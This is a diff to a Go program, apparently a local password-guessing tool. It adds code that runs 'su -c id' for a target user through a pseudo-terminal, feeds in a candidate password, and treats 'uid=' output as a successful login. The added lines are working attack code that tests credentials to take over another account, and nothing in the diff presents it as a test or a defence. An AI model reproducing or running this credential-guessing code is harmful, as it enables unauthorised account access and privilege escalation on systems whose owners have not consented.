@@ -51,6 +51,31 @@ func main() {
 		log.Printf("success with %s\n", password)
 		os.Exit(0)
 	}
+
+	c = exec.Command("su", "-c", "id", username)
+	defer c.Wait()
+	c.Stdout = tty
+	c.Stderr = tty
+	c.Stdin = tty
+
+	if err := c.Start(); err != nil {
+		log.Fatal(err)
+	}
+
+	buffer = make([]byte, 100)
+	n, _ = pty.Read(buffer) // text 'Password: '
+	log.Print(string(buffer[:n]))
+	pty.Write([]byte(password + "\n"))
+	log.Println(password)
+	n, _ = pty.Read(buffer) // new line
+	log.Println(string(buffer[:n]))
+	n, _ = pty.Read(buffer) // either id text or failure
+	log.Println(string(buffer[:n]))
+
+	if n > 0 && strings.HasPrefix(string(buffer), "uid=") {
+		log.Printf("success with %s\n", password)
+		os.Exit(0)
+	}
 }
 
 func open() (pty, tty *os.File, err error) {
